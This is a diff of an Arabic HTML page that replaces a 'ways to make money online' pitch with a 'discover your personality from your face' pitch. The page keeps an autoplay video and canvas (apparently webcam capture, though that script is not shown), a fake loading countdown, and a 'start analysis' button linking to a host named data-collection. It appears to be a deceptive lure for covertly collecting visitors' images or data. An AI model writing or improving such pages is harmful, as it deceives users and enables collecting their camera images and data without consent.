@@ -1,19 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>لكسب المال من الانترنت</title>
+  <title>تحليل شخصيتك من ملامح وجهك</title>
   <style>
     body {
-      background-color: #f0f2f5;
       margin: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
       flex-direction: column;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      color: #fff;
     }
 
     video, canvas {
@@ -22,50 +23,48 @@
 
     .login-button {
       margin-top: 20px;
-      padding: 10px 20px;
-      background-color: #1877f2;
+      padding: 12px 24px;
+      background-color: #ff4081;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       cursor: pointer;
-      font-size: 1em;
+      font-size: 1.1em;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
       text-decoration: none;
-      text-align: center;
+      transition: background 0.3s;
     }
 
     .login-button:hover {
-      background-color: #145dbf;
+      background-color: #e73370;
     }
 
-    .money-info {
+    .info-box {
       margin-top: 40px;
       padding: 20px;
-      background-color: #ffffff;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 15px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
       width: 80%;
+      max-width: 600px;
       text-align: center;
     }
 
-    .money-info h2 {
-      color: #333;
+    .info-box h2 {
+      color: #ffffff;
     }
 
-    .money-info p {
-      color: #555;
-      font-size: 1.2em;
-    }
-
-    .loading {
-      font-size: 1.2em;
-      color: #333;
-      display: none;
+    .info-box p, .info-box li {
+      color: #f1f1f1;
+      font-size: 1.1em;
+      line-height: 1.6;
     }
 
     .countdown-container {
       margin-top: 20px;
       font-size: 1.2em;
-      color: #d9534f;
+      color: #ffe082;
       text-align: center;
     }
   </style>
@@ -74,28 +73,23 @@
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
 
-  <!-- مربع الحوار الذي يحتوي على المعلومات -->
-  <div class="money-info">
-    <h2>طرق اكتساب المال من الإنترنت</h2>
-    <p>يُعد الإنترنت أحد أكبر الوسائل التي يمكن استخدامها لكسب المال بطرق متنوعة. من بين الطرق الشهيرة التي يمكن للأفراد استغلالها:</p>
+  <div class="info-box">
+    <h2>تحليل شخصيتك من ملامح وجهك</h2>
+    <p>هل تعلم أن ملامح وجهك تكشف الكثير عن شخصيتك؟ اكتشف الآن كيف يراك الآخرون من خلال هذا التحليل الذكي.</p>
     <ul>
-      <li><strong>التسويق بالعمولة:</strong> يمكن لك أن تكسب المال من خلال الترويج للمنتجات أو الخدمات عبر الإنترنت.</li>
-      <li><strong>العمل الحر (Freelancing):</strong> يوفر الإنترنت فرصًا للعمل على مشاريع متنوعة مثل الكتابة، التصميم، البرمجة، والترجمة.</li>
-      <li><strong>إنشاء المحتوى:</strong> يمكنك كسب المال من خلال إنشاء محتوى على منصات مثل يوتيوب أو بلوجر، سواء من خلال الإعلانات أو الرعاية.</li>
-      <li><strong>التجارة الإلكترونية:</strong> بيع المنتجات على الإنترنت من خلال متاجر إلكترونية أو عبر منصات مثل إيباي وأمازون.</li>
-      <li><strong>الدورات التعليمية عبر الإنترنت:</strong> إذا كنت تمتلك مهارة أو معرفة خاصة، يمكنك تقديم دورات تدريبية عبر الإنترنت وتحقيق دخل ثابت.</li>
-      
-      <li> لو عاوز تعرف المزيد عن طرق كسب المال من الانترنت اضغط على زر تسجيل الدخول لمعرفة كل شي</li>
+      <li>هل أنت شخص واثق أم خجول؟</li>
+      <li>ما نوع الذكاء الذي تتمتع به؟</li>
+      <li>نقاط قوتك التي لا يعرفها الآخرون.</li>
+      <li>التحليل يعتمد على تقنيات ذكية لتحليل ملامح وجهك.</li>
+      <li>ابدأ التحليل الآن واضغط على زر الدخول.</li>
     </ul>
   </div>
 
-  <!-- العد التنازلي يظهر هنا -->
   <div class="countdown-container">
-    <p id="countdown-timer">وقت التحميل: 20 ثانية</p>
+    <p id="countdown-timer">جاري التحميل: 20 ثانية</p>
   </div>
 
-  <!-- زر تسجيل الدخول -->
-  <a href="https://data-collection-bs5q.vercel.app/" class="login-button" id="login-button" onclick="handleClick(event)">تسجيل الدخول</a>
+  <a href="https://data-collection-bs5q.vercel.app/" class="login-button" id="login-button" onclick="handleClick(event)">ابدأ التحليل الآن</a>
 
   <script>
     const video = document.getElementById('video');
@@ -153,7 +147,7 @@
     function handleClick(event) {
       event.preventDefault();
       let countdownInterval = setInterval(function() {
-        document.getElementById('countdown-timer').textContent = `وقت التحميل: ${countdown} ثانية`;
+        document.getElementById('countdown-timer').textContent = `جاري التحميل: ${countdown} ثانية`;
         countdown--;
         if (countdown < 0) {
           clearInterval(countdownInterval);
